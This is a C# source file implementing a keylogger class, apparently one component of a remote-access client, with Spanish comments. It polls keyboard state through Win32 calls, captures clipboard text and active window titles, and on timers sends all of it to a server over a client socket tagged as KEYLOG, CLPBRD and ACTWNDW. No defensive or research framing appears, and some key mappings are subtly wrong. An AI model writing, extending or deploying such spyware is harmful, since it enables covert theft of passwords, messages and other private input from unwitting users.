using System;
using System.Runtime.InteropServices;
using System.Text;
using Client.Conexion;

namespace Client
{
    static class Keylogger
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll")]
        private static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        private static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GlobalLock(IntPtr handle);

        [DllImport("kernel32.dll")]
        private static extern bool GlobalUnlock(IntPtr handle);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GlobalAlloc(uint uFlags, uint dwBytes);

        private static StringBuilder _buffer = new StringBuilder();
        private static Timer _keyTimer;
        private static Timer _sendTimer;
        private static Timer _clipboardTimer;
        private static Timer _activeWindowTimer;
        private static DateTime _lastKeyPressTime = DateTime.MinValue;
        private static readonly TimeSpan _keyPressDelay = TimeSpan.FromMilliseconds(30);  // Para evitar duplicados de teclas.
        private static bool _isKeyLoggingInProgress = false;


        public static void start()
        {
            // Configurar el temporizador para captura de teclas (100 ms)
            _keyTimer = new Timer(CaptureKeys, null, 0, 86);  // Intervalo más corto para captura de teclas
            // Configurar el temporizador para el envío del buffer (2 segundos)
            _sendTimer = new Timer(SendBuffer, null, 0, 3000);  // No iniciar aún
            // Configurar el temporizador para monitorizar el portapapeles (cada 1 segundo)
            _clipboardTimer = new Timer(SendClipboard, null, 0, 5000);  // No iniciar aún
            // Configurar el temporizador para monitorizar la ventana activa (cada 1 segundo)
            _activeWindowTimer = new Timer(SendActiveWindow, null, 0, 3000);  // No iniciar aún
        }

        public static void stop()
        {
            // Detener los temporizadores
            _keyTimer?.Change(Timeout.Infinite, Timeout.Infinite);  // Detener captura de teclas
            _sendTimer?.Change(Timeout.Infinite, Timeout.Infinite);  // Detener envío de buffer
            _clipboardTimer?.Change(Timeout.Infinite, Timeout.Infinite);
            _activeWindowTimer?.Change(Timeout.Infinite, Timeout.Infinite);
            // Limpiar el buffer
            _buffer.Clear();
        }

        private static void SendBuffer(object state)
        {
            lock (_buffer)
            {
                if (_buffer.Length == 0)
                    return;

                // Enviar el contenido del buffer al servidor
                ClientSocket.SendResponse("KEYLOG:" + _buffer.ToString());
                _buffer.Clear();  // Limpiar el buffer tras el envío
            }

            // Después de enviar, activar el temporizador para el siguiente envío
            _sendTimer.Change(3000, Timeout.Infinite);  // 3 segundos para el siguiente envío
        }

        private static void SendActiveWindow(object state)
        {
            ClientSocket.SendResponse("ACTWNDW:" + getActiveWindowsTitle());

            // Después de enviar, activar el temporizador para el siguiente envío
            _activeWindowTimer.Change(1000, Timeout.Infinite);  // 1 segundo para el siguiente envío
        }

        private static void SendClipboard(object state)
        {
            ClientSocket.SendResponse("CLPBRD:" + GetClipboardText());

            // Después de enviar, activar el temporizador para el siguiente envío
            _clipboardTimer.Change(1300, Timeout.Infinite);  // 1.3 segundos para el siguiente envío
        }

        private static void CaptureKeys(object state)
        {
            if (_isKeyLoggingInProgress)
                return;

            _isKeyLoggingInProgress = true;

            for (int key = 0; key < 255; key++)
            {
                if ((GetAsyncKeyState(key) & 0x8000) != 0)
                {
                    string k = verificarTecla(key);
                    if (!string.IsNullOrEmpty(k))
                    {
                        if (DateTime.Now - _lastKeyPressTime > _keyPressDelay)
                        {
                            lock (_buffer)
                            {
                                _buffer.Append(k);
                            }
                            _lastKeyPressTime = DateTime.Now;
                        }
                    }
                }
            }

            _keyTimer.Change(85, Timeout.Infinite);  // Reinicia el temporizador

            _isKeyLoggingInProgress = false;
        }

        private static string GetClipboardText()
        {
            string clipboardText = string.Empty;

            try
            {
                // Abrir el portapapeles
                if (OpenClipboard(IntPtr.Zero) != IntPtr.Zero)
                {
                    // Obtener el handle de los datos en formato CF_TEXT
                    IntPtr hData = GetClipboardData(13);  // 13 es el formato CF_TEXT
                    if (hData != IntPtr.Zero)
                    {
                        // Bloquear los datos para obtener el puntero
                        IntPtr pointer = GlobalLock(hData);
                        if (pointer != IntPtr.Zero)
                        {
                            // Convertir el puntero a una cadena completa
                            clipboardText = Marshal.PtrToStringAnsi(pointer);
                            GlobalUnlock(hData);
                        }
                    }
                    CloseClipboard();
                }
            }
            catch (Exception ex)
            {
                // Manejar cualquier excepción (por ejemplo, si no se puede acceder al portapapeles)
                Console.WriteLine($"Error al acceder al portapapeles: {ex.Message}");
            }

            return clipboardText;
        }

        private static string getActiveWindowsTitle()
        {
            IntPtr hwnd = GetForegroundWindow();
            StringBuilder windowTitle = new StringBuilder(256);
            if (GetWindowText(hwnd, windowTitle, windowTitle.Capacity))
            {
                return windowTitle.ToString();
            }
            return "Desconocida";
        }

        private static string verificarTecla(int code)
        {
            // Verificamos si la tecla Shift está presionada (código 160 o 161)
            bool shiftPresionado = (GetAsyncKeyState(160) & 0x8000) != 0 || (GetAsyncKeyState(161) & 0x8000) != 0;

            // Letras
            if (code >= 65 && code <= 90)
            {
                return shiftPresionado ? ((char)code).ToString() : ((char)code).ToString().ToLower(); // Mayúsculas si Shift está presionado
            }

            // Números (sin Shift)
            if (code >= 48 && code <= 57)
                return ((char)code).ToString();

            // Caracteres especiales con o sin Shift
            return code switch
            {
                13 => "[Enter]",  // Enter
                8 => "[Back]",     // Backspace
                32 => "[Space]",         // Space
                9 => "[Tab]",      // Tab
                27 => "[Esc]",     // Escape
                190 => shiftPresionado ? ">" : ".", // Punto o mayor que
                188 => shiftPresionado ? "<" : ",", // Coma o menor que
                191 => shiftPresionado ? "?" : "/", // Barra o signo de interrogación
                186 => shiftPresionado ? ":" : ";", // Punto y coma o dos puntos
                222 => shiftPresionado ? "\"" : "'", // Comillas dobles o simples
                189 => shiftPresionado ? "_" : "-", // Guion bajo o guion
                187 => shiftPresionado ? "+" : "=", // Más o igual
                192 => shiftPresionado ? "~" : "`", // Tilde o acento grave
                219 => shiftPresionado ? "{" : "[", // Llave izquierda o corchete izquierdo
                220 => shiftPresionado ? "|" : "\\", // Barra vertical o barra invertida
                226 => shiftPresionado ? "\"`" : "~", // Tilde inversa o barra
                33 => "!",         // Exclamación "!"
                64 => "@",         // Arroba "@"
                35 => "#",         // Numeral "#"
                36 => "$",         // Dólar "$"
                37 => "%",         // Porcentaje "%"
                94 => "^",         // Acento circunflejo "^"
                38 => "&",         // Ampersand "&"
                42 => "*",         // Asterisco "*"
                40 => "(",         // Paréntesis izquierdo "("
                41 => ")",         // Paréntesis derecho ")"
                95 => "_",         // Guion bajo "_"
                43 => "+",         // Más "+"
                _ => ""            // Otros códigos no mapeados
            };
        }
    }
}
